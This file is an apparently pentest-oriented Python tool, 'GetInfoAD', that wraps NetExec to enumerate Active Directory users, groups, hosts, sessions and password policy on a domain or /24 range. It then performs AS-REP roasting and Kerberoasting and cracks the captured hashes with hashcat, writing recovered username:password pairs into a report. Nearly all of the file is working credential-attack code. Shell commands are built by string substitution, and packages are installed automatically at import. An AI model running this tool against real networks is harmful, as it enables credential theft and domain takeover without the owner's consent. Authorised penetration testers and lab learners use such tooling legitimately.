import os
import subprocess
import sys
import argparse
import re
import shutil
import site
from collections import defaultdict

DEBUG = False

def install_termcolor_if_missing():
    try:
        import termcolor
    except ImportError:
        print("[termcolor]: Module missing. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "termcolor"], check=True)
        site.main()  # reload paths

def install_pyfiglet_if_missing():
    try:
        import pyfiglet
    except ImportError:
        print("[pyfiglet]: Module missing. Installing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyfiglet"], check=True)
        site.main()  # reload paths

install_termcolor_if_missing()
install_pyfiglet_if_missing()

from termcolor import colored
import pyfiglet

def validate_ip(ip):
    """Validates and processes an IP address that may include a /24 mask"""
    if not ip:
        return None, False
    
    is_network = "/24" in ip
    if is_network:
        base_ip = ip.replace("/24", "")
        try:
            parts = base_ip.split('.')
            if len(parts) != 4:
                return None, False
            for part in parts:
                if not part.isdigit() or not 0 <= int(part) <= 255:
                    return None, False
            return base_ip, True  # Return IP without mask and network indicator
        except:
            return None, False
    else:
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return None, False
            for part in parts:
                if not part.isdigit() or not 0 <= int(part) <= 255:
                    return None, False
            return ip, False
        except:
            return None, False

def check_env_vars():
    env = {}
    for var in ["IP", "USER", "PASSWORD"]:
        value = os.getenv(var)
        if var == "IP":
            value, is_network = validate_ip(value)
            env[var] = value
            env["IS_NETWORK"] = "True" if is_network else "False"
        else:
            env[var] = value
    return env

def show_banner():
    print()
    print(colored("╔══════════════════════════════════════════════════════════════╗", "cyan"))
    figlet = pyfiglet.Figlet(font='slant')
    text_lines = figlet.renderText('GetInfoAD').rstrip().split('\n')
    for line in text_lines:
        print(colored("║", "cyan") + colored(f"{line:^62}", "green") + colored("║", "cyan"))
    print(colored("╠══════════════════════════════════════════════════════════════╣", "cyan"))
    title = "Active Directory Enumeration"
    print(colored("║", "cyan") + colored(f"{title:^62}", "blue", attrs=["bold"]) + colored("║", "cyan"))
    print(colored("╠══════════════════════════════════════════════════════════════╣", "cyan"))
    powered_by = "  [*] Powered by NXC"
    print(colored("║", "cyan") + colored("  [*] ", "yellow") + colored("Powered by", "white") + colored(" NXC", "green", attrs=["bold"]) + " " * (62 - len(powered_by)) + colored("║", "cyan"))
    created_by = "  [*] Created by frozenk"
    print(colored("║", "cyan") + colored("  [*] ", "yellow") + colored("Created by", "white") + colored(" frozenk", "blue", attrs=["bold"]) + " " * (62 - len(created_by)) + colored("║", "cyan"))
    print(colored("╚══════════════════════════════════════════════════════════════╝", "cyan"))
    print()

def show_domain_info(domain):
    print(colored("╔══════════════════════════════════════════════════════════════╗", "cyan"))
    domain_line = f"  [+] Target Domain: {domain}"
    padding = 62 - len(domain_line)
    print(colored("║", "cyan") + colored(domain_line, "yellow", attrs=["bold"]) + " " * padding + colored("║", "cyan"))
    print(colored("╚══════════════════════════════════════════════════════════════╝", "cyan"))
    #print()


def banner():
    show_banner()
    domain = get_domain_name()
    show_domain_info(domain)
    return domain

def show_env(env):
    print(colored("🌐 Environment variables:", "yellow", attrs=["bold"]))
    for key, value in env.items():
        if key == "IS_NETWORK":
            continue
        if value:
            if key == "IP":
                display = colored("✅", "green") + colored(f" {key} = ", "white") + colored(value, "cyan", attrs=["bold"])
                if env.get("IS_NETWORK", False) and "/24" in os.getenv("IP", ""):
                    display += colored(" (/24)", "cyan")
            else:
                display = colored("✅", "green") + colored(f" {key} = ", "white") + colored(value, "cyan", attrs=["bold"])
        else:
            if key == "IP":
                display = colored("❌", "red") + colored(f" {key} is not defined or is not a valid IP address", "red")
            else:
                display = colored("❌", "red") + colored(f" {key} is not defined", "red")
        print("   " + display)
    print()

def generate_network_ips(base_ip):
    """Generates all IP addresses in a /24 network"""
    parts = base_ip.split('.')
    if len(parts) != 4:
        return [base_ip]
    
    network_ips = []
    for i in range(1, 255):  # Exclude .0 and .255
        network_ips.append(f"{parts[0]}.{parts[1]}.{parts[2]}.{i}")
    
    return network_ips

def run_command(command, use_network=False, use_dc=False):
    """Executes a command, with option to use all network IPs or only the DC"""
    try:
        is_network = os.getenv("IS_NETWORK", "False").lower() == "true"
        
        if use_dc and os.getenv("DC_IP"):
            dc_ip = os.getenv("DC_IP")
            current_command = command.replace("$IP", dc_ip)
            
            if DEBUG:
                print(colored(f"🔍 Command (DC): {current_command}", "yellow"))
            
            result = subprocess.run(current_command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True)
            
            if DEBUG:
                print(colored("📤 Output:", "yellow"))
                print(result.stdout)
                if result.stderr:
                    print(colored("📤 Error:", "red"))
                    print(result.stderr)
            
            return result.stdout.strip().splitlines()
        
        elif use_network and is_network:
            base_ip = os.getenv("IP")
            network_ips = generate_network_ips(base_ip)
            
            all_results = []
            for ip in network_ips:
                current_command = command.replace("$IP", ip)
                print(colored(f"▶️  Running on {ip}...", "cyan"))
                
                if DEBUG:
                    print(colored(f"🔍 Command: {current_command}", "yellow"))
                
                result = subprocess.run(current_command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True)
                
                if DEBUG:
                    print(colored("📤 Output:", "yellow"))
                    print(result.stdout)
                    if result.stderr:
                        print(colored("📤 Error:", "red"))
                        print(result.stderr)
                
                all_results.extend(result.stdout.strip().splitlines())
            
            return all_results
        else:
            if DEBUG:
                print(colored(f"🔍 Command: {command}", "yellow"))
            
            result = subprocess.run(command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True)
            
            if DEBUG:
                print(colored("📤 Output:", "yellow"))
                print(result.stdout)
                if result.stderr:
                    print(colored("📤 Error:", "red"))
                    print(result.stderr)
            
            return result.stdout.strip().splitlines()
    except subprocess.CalledProcessError as e:
        print(colored(f"❌ Command failed: {command}", "red"))
        print(colored(e.stderr.strip(), "red"))
        return []

def ask_to_save(data, default_name):
    choice = input(colored("\n📂 Do you want to save this list to a file? (y/n) > ", "yellow")).strip().lower()
    if choice == "y":
        filename = input(colored(f"📝 Enter filename (default: {default_name}) > ", "cyan")).strip()
        filename = filename if filename else default_name
        try:
            with open(filename, "w") as f:
                f.write("\n".join(data) + "\n")
            print(colored(f"✅ Successfully saved to: {filename}", "green", attrs=["bold"]))
        except Exception as e:
            print(colored("❌ Error while saving:", "red"), e)
    else:
        print(colored("📬 List not saved.", "yellow"))

def get_users():
    command = '''nxc ldap $IP -u $USER -p $PASSWORD --users'''
    lines = run_command(command, use_network=False, use_dc=True)
    users = []
    for line in lines:
        if (
            line.startswith("LDAP")
            and not any(excl in line for excl in [
                "-Username-", "krbtgt", "Guest", "DefaultAccount",
                "WDAGUtilityAccount", "[+]", "[*]"
            ])
        ):
            parts = line.split()
            if len(parts) >= 5:
                users.append(parts[4])
    return sorted(set(users))

def get_machines(with_versions=False):
    command = '''nxc smb $IP -u $USER -p $PASSWORD'''
    lines = run_command(command, use_network=False, use_dc=True)
    hosts = {}
    for line in lines:
        match_name = re.search(r'\(name:([^)]+)\)', line)
        if match_name:
            hostname = match_name.group(1).strip()
            if with_versions:
                os_match = re.search(r'\[\*\] (.*?) \(name:', line)
                os_info = os_match.group(1).strip() if os_match else "Unknown OS"
                hosts[hostname] = os_info
            else:
                hosts[hostname] = None
    return hosts

def get_groups():
    command = '''nxc ldap $IP -u $USER -p $PASSWORD --groups'''
    lines = run_command(command, use_network=False, use_dc=True)
    groups = []
    for line in lines:
        match = re.search(r'\s+DC01\s+(.*?)\s+membercount', line)
        if match:
            group = match.group(1).strip()
            if group:
                groups.append(group)
    return sorted(set(groups))

def get_loggedon_users():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --loggedon-users'''
    lines = run_command(command, use_network=True)
    sessions = defaultdict(lambda: {"ip": "", "users": []})
    for line in lines:
        match_host = re.match(r'^SMB\s+(\S+)\s+\d+\s+(\S+)', line)
        if match_host:
            ip = match_host.group(1)
            host = match_host.group(2)
            sessions[host]["ip"] = ip
        match_user = re.search(r'(\\\\|\s)([\w.-]+\\[\w.-]+)\s+logon_server', line)
        if match_user:
            user = match_user.group(2).strip()
            host = line.split()[3]
            if user not in sessions[host]["users"]:
                sessions[host]["users"].append(user)
    return dict(sessions)

def get_interfaces():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --interfaces'''
    lines = run_command(command, use_network=True)
    parsed = []
    seen = set()
    for line in lines:
        match = re.search(r'(Ethernet\d+)\s+\|\s+([\d.]+)\s+\|\s+(.*?)\s+\|\s+(.*?)\s+\|\s+(True|False)', line)
        if match:
            entry = f"{match.group(1)} - {match.group(2)}  | Mask: {match.group(3)}  | Gateway: {match.group(4)}  | DHCP: {match.group(5)}"
            if entry not in seen:
                parsed.append(entry)
                seen.add(entry)
    return parsed

def get_passpol():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --pass-pol'''
    lines = run_command(command, use_network=False, use_dc=True)
    filtered = []
    seen = set()
    for line in lines:
        clean = re.sub(r'^SMB\s+\S+\s+\d+\s+\S+\s+', '', line).strip()
        if clean.startswith("[+]"):
            continue
        if any(keyword in clean.lower() for keyword in ["password", "lockout", "complex", "minimum", "maximum", "reset", "threshold"]):
            if clean not in seen:
                filtered.append(clean)
                seen.add(clean)
    return filtered

def get_domain_name():
    command = '''nxc smb $IP -u $USER -p $PASSWORD'''
    result = run_command(command, use_network=True)  # On all network IPs to find DC
    domain = "UnknownDomain.local"
    dc_ip = None
    
    for line in result:
        match_domain = re.search(r'\(domain:([^)]+)\)', line)
        if match_domain:
            domain = match_domain.group(1).strip()
        
        match_dc = re.search(r'SMB\s+(\d+\.\d+\.\d+\.\d+)\s+\d+\s+(DC\d*|DC)', line)
        if match_dc and not dc_ip:
            dc_ip = match_dc.group(1)
    
    if dc_ip:
        os.environ["DC_IP"] = dc_ip
        if DEBUG:
            print(colored(f"🔍 DC detected at IP address: {dc_ip}", "green"))
    
    return domain

def get_asreproast(users):
    users_file = "userdomaine.txt"
    output_file = "asreproast_output.txt"

    try:
        with open(users_file, "w") as f:
            f.write("\n".join(users) + "\n")
    except Exception as e:
        print(colored("❌ Failed to write user list:", "red"), e)
        return []

    command = f"nxc ldap $IP -u {users_file} -p '' --asreproast {output_file}"
    run_command(command, use_network=False, use_dc=True)

    if not os.path.exists(output_file) or os.path.getsize(output_file) == 0:
        print(colored("❌ AS-REP output file not found or empty.", "red"))
        return []

    try:
        with open(output_file, "r") as f:
            hashes = set(line.strip() for line in f if "$krb5asrep$" in line)
        with open(output_file, "w") as f:
            for h in sorted(hashes):
                f.write(h + "\n")
        return sorted(hashes)
    except Exception as e:
        print(colored("❌ Failed to process AS-REP hashes:", "red"), e)
        return []

def get_kerberost():
    output_file = "kerberost.txt"

    command = f"nxc ldap $IP -u $USER -p $PASSWORD --kerberoasting {output_file}"
    run_command(command, use_network=False, use_dc=True)

    if not os.path.exists(output_file) or os.path.getsize(output_file) == 0:
        print(colored("❌ Kerberos Roasting output file not found or empty.", "red"))
        return []

    try:
        with open(output_file, "r") as f:
            hashes = set(line.strip() for line in f if "$krb5tgs$" in line)
        with open(output_file, "w") as f:
            for h in sorted(hashes):
                f.write(h + "\n")
        return sorted(hashes)
    except Exception as e:
        print(colored("❌ Failed to process Kerberos hashes:", "red"), e)
        return []

def ask_crack_kerberos_hashes():
    print()
    choice = input(colored("🧨 Do you want to try to crack Kerberos hashes now ? (y/n) > ", "yellow")).strip().lower()
    if choice != "y":
        print(colored("🚫 Skipping hash cracking.", "yellow"))
        return

    print(colored("📂 Select your wordlist...", "cyan"))
    try:
        wordlist_cmd = "find /opt/lists /usr/share/wordlists /usr/share/wfuzz /usr/share/dirb -type f | fzf"
        wordlist = subprocess.check_output(wordlist_cmd, shell=True, text=True).strip()

        if not wordlist:
            print(colored("❌ No wordlist selected (fzf exited).", "red"))
            return

    except subprocess.CalledProcessError:
        print(colored("❌ Failed to launch fzf-wordlists.", "red"))
        return

    hashfile = "kerberost.txt"
    if not os.path.isfile(hashfile):
        print(colored(f"❌ Hash file not found: {hashfile}", "red"))
        return

    print(colored(f"🚀 Launching hashcat on {hashfile} using {wordlist}...", "magenta"))
    potfile = "hashcat.potfile"

    command = f"hashcat -m 13100 {os.path.abspath(hashfile)} {os.path.abspath(wordlist)} --quiet --force --potfile-path {os.path.abspath(potfile)}"

    try:
        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, text=True)

        cracked = []
        with open(potfile, 'r') as f:
            for line in f:
                if line.strip():
                    parts = line.strip().split(":")
                    if len(parts) >= 3:
                        match = re.search(r'\$krb5tgs\$23\$(?P<user>[^@]+)@', parts[0])
                        if match:
                            user = match.group("user")
                            password = parts[-1]
                            cracked.append(f"{user}:{password}")

        if cracked:
            print(colored("\n🎉 Cracked credentials (username:password):", "green", attrs=["bold"]))
            for cred in cracked:
                print(colored(cred, "cyan"))
        else:
            print(colored("❌ No hashes cracked.", "red"))
    
    except subprocess.CalledProcessError:
        print(colored("🚀 Hashcat completed with errors, displaying cracked hashes...", "yellow"))

        cracked = []
        with open(potfile, 'r') as f:
            for line in f:
                if line.strip():
                    parts = line.strip().split(":")
                    if len(parts) >= 3:
                        match = re.search(r'\$krb5tgs\$23\$(?P<user>[^@]+)@', parts[0])
                        if match:
                            user = match.group("user")
                            password = parts[-1]
                            cracked.append(f"{user}:{password}")

        if cracked:
            print(colored("\n🎉 Cracked credentials (username:password):", "green", attrs=["bold"]))
            for cred in cracked:
                print(colored(cred, "cyan"))
        else:
            print(colored("❌ No hashes cracked.", "red"))

def ask_crack_hashes():
    print()
    choice = input(colored("🧨 Do you want to try to crack AS-REP hashes now ? (y/n) > ", "yellow")).strip().lower()
    if choice != "y":
        print(colored("🚫 Skipping hash cracking.", "yellow"))
        return

    print(colored("📂 Select your wordlist...", "cyan"))
    try:
        wordlist_cmd = "find /opt/lists /usr/share/wordlists /usr/share/wfuzz /usr/share/dirb -type f | fzf"
        wordlist = subprocess.check_output(wordlist_cmd, shell=True, text=True).strip()

        if not wordlist:
            print(colored("❌ No wordlist selected (fzf exited).", "red"))
            return

    except subprocess.CalledProcessError:
        print(colored("❌ Failed to launch fzf-wordlists.", "red"))
        return

    hashfile = "asreproast_output.txt"
    if not os.path.isfile(hashfile):
        print(colored(f"❌ Hash file not found: {hashfile}", "red"))
        return

    print(colored(f"🚀 Launching hashcat on {hashfile} using {wordlist}...", "magenta"))
    potfile = "hashcat.potfile"

    try:
        command = f"hashcat {hashfile} {wordlist} --potfile-path {potfile} --quiet --force"
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if not os.path.isfile(potfile):
            print(colored("❌ Potfile not found, no results to show.", "red"))
            return

        cracked = []
        with open(potfile, "r") as f:
            for line in f:
                if "$krb5asrep$" in line:
                    parts = line.strip().split(":")
                    if len(parts) >= 3:
                        match = re.search(r'\$krb5asrep\$23\$(?P<user>[^@]+)@', parts[0])
                        if match:
                            user = match.group("user")
                            password = parts[-1]
                            cracked.append(f"{user}:{password}")

        if cracked:
            print(colored("\n🎉 Cracked credentials (username:password):", "green", attrs=["bold"]))
            for cred in cracked:
                print(colored(cred, "cyan"))
        else:
            print(colored("❌ No hashes cracked.", "red"))

    except Exception as e:
        print(colored("❌ Unexpected error during hashcat execution:", "red"), e)

def full_report():
    domain = get_domain_name()

    print(colored("\n--- Collecting ---", "yellow", attrs=["bold"]))
    print(colored("▶️  Retrieving domain users...", "cyan"))
    users = get_users()
    
    print(colored("▶️  Retrieving domain groups...", "cyan"))
    groups = get_groups()
    
    print(colored("▶️  Retrieving computers...", "cyan"))
    machines = get_machines()
    machines_os = get_machines(with_versions=True)
    
    print(colored("▶️  Retrieving logged-on users (Targeted DC)...", "cyan"))
    loggedon = get_loggedon_users()
    
    print(colored("▶️  Retrieving network interfaces (Targeted DC)...", "cyan"))
    interfaces = get_interfaces()
    
    print(colored("▶️  Retrieving password policy (Targeted DC)...", "cyan"))
    passpol = get_passpol()
    print(colored("--- End Collecting ---\n", "yellow", attrs=["bold"]))
    
    print(colored("--- Roasting ---", "yellow", attrs=["bold"]))
    print(colored("▶️  Performing AS-REP Roasting...", "cyan"))
    asreproast = get_asreproast(users)
    if asreproast:
        print(colored(f"✅ Found {len(asreproast)} AS-REP hash(es). Saved in asreproast_hashes.txt", "green"))
    
    print(colored("▶️  Performing Kerberos Roasting...", "cyan"))
    kerberost = get_kerberost()
    if kerberost:
        print(colored(f"✅ Found {len(kerberost)} Kerberoastable hash(es). Saved in kerberoast_hashes.txt", "green"))
    print(colored("--- End Roasting ---\n", "yellow", attrs=["bold"]))

    if asreproast:
        print(colored("\n🔄 Launching AS-REP hash cracking...", "cyan"))
        ask_crack_hashes()
    
    if kerberost:
        print(colored("\n🔄 Launching Kerberos hash cracking...", "cyan"))
        ask_crack_kerberos_hashes()

    md = []
    md.append(f"# Active Directory Report - {domain}\n")

    if users:
        md.append("## 👤 Domain Users\n")
        md.extend(users)
        md.append("")

    if groups:
        md.append("## 👥 Domain Groups\n")
        md.extend(groups)
        md.append("")

    if machines:
        md.append("## 💻 Domain Machines\n")
        md.extend(machines.keys())
        md.append("")

    if machines_os:
        md.append("## 📍 Operating Systems\n")
        for host, osinfo in machines_os.items():
            md.append(f"{host}  — {osinfo}")
        md.append("")

    if loggedon:
        md.append("## 💻 Active Users \n")
        for host, info in loggedon.items():
            md.append(f"### Logged-on {host} ({info['ip']})")
            if info["users"]:
                md.append("```")
                for user in info["users"]:
                    md.append(f"  • {user}")
                md.append("```\n")
            else:
                md.append("```")
                md.append("  • No users currently logged on")
                md.append("```\n")
        md.append("")

    if interfaces:
        md.append("## 🌐 Network Interfaces\n```")
        md.extend(interfaces)
        md.append("```\n")

    if passpol:
        md.append("## 🔐 Password Policy\n```")
        md.extend(passpol)
        md.append("```\n")

    md.append("## 🔥 AS-REP Roasting\n```")
    if asreproast:
        md.extend(asreproast)
    else:
        md.append("No AS-REP roastable account found.")
    md.append("```\n")

    md.append("## 🔥 Kerberoasting\n```")
    if kerberost:
        md.extend(kerberost)
    else:
        md.append("No Kerberos roastable account found.")
    md.append("```\n")

    md.append("## 🔑 Cracked Credentials\n")
    
    potfile = "hashcat.potfile"
    if os.path.exists(potfile):
        md.append("### Cracked Passwords\n```")
        with open(potfile, 'r') as f:
            for line in f:
                if line.strip():
                    if "$krb5asrep$" in line or "$krb5tgs$" in line:
                        parts = line.strip().split(":")
                        if len(parts) >= 3:
                            match = re.search(r'\$(krb5asrep|krb5tgs)\$23\$(?P<user>[^@]+)@', parts[0])
                            if match:
                                user = match.group("user")
                                password = parts[-1]
                                md.append(f"{user}:{password}")
        md.append("```\n")

    markdown_output = "\n".join(md)
    filename = "report.md"

    try:
        with open(filename, "w") as f:
            f.write(markdown_output + "\n")
        print(colored(f"✅ Report saved to: {filename}", "green", attrs=["bold"]))
        print(colored(f"✨ Opening report...", "magenta"))
        os.system(f"glow {filename}")
        
    except Exception as e:
        print(colored("❌ Error while saving or opening the report:", "red"), e)

    ask_to_save(markdown_output.splitlines(), filename)

def main():
    parser = argparse.ArgumentParser(description="Active Directory enumeration via SMB")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--users", action="store_true", help="List domain users")
    group.add_argument("-m", "--machines", action="store_true", help="List exposed machine names")
    group.add_argument("-o", "--os", action="store_true", help="List machines with their operating system")
    group.add_argument("-f", "--full", action="store_true", help="Show all info in Markdown format")
    group.add_argument("--groups", action="store_true", help="List domain groups")
    group.add_argument("--kerberstable", action="store_true", help="Perform Kerberos roasting only")
    group.add_argument("-a", "--asreprostable", action="store_true", help="Perform AS-REP roasting only")
    
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug mode to show all commands and outputs")

    args = parser.parse_args()

    global DEBUG
    DEBUG = args.debug

    banner()
    env = check_env_vars()
    show_env(env)

    if None in env.values():
        print(colored("💡 Please define all required environment variables before running this script.", "yellow", attrs=["bold"]))
        print(colored("Example: exegol-history add creds -u 'MyUser' -p 'Password123' ; exegol-history apply creds", "cyan"))
        sys.exit(1)

    if DEBUG:
        print(colored("🔧 Debug mode enabled - Displaying all commands and outputs", "yellow", attrs=["bold"]))
        print()

    if not any([args.users, args.machines, args.os, args.full, args.groups, args.kerberstable, args.asreprostable]):
        args.full = True

    if args.users:
        results = get_users()
        print("\n".join(results))
        ask_to_save(results, "users.txt")

    elif args.kerberstable:
         results = get_kerberost()  # No need for specific user
         if results:
            print("\n".join(results))
            ask_crack_kerberos_hashes()
         else:
           print(colored("No Kerberos roastable account found.", "yellow"))
           ask_to_save(results if results else ["No Kerberos roastable account found."], "kerberost.txt")

    elif args.asreprostable:
        users = get_users()
        results = get_asreproast(users)
        if results:
            print("\n".join(results))
            ask_crack_hashes()
        else:
            print(colored("No AS-REP roastable account found.", "yellow"))
            ask_to_save(results if results else ["No AS-REP roastable account found."], "asreproast.txt")

    elif args.machines:
        results = get_machines()
        print("\n".join(results.keys()))
        ask_to_save(list(results.keys()), "machines.txt")

    elif args.os:
        results = get_machines(with_versions=True)
        output = [f"{host} — {osinfo}" for host, osinfo in results.items()]
        print("\n".join(output))
        ask_to_save(output, "machines_with_os.txt")

    elif args.groups:
        results = get_groups()
        print("\n".join(results))
        ask_to_save(results, "groups.txt")

    elif args.full:
        full_report()

if __name__ == "__main__":
    main()
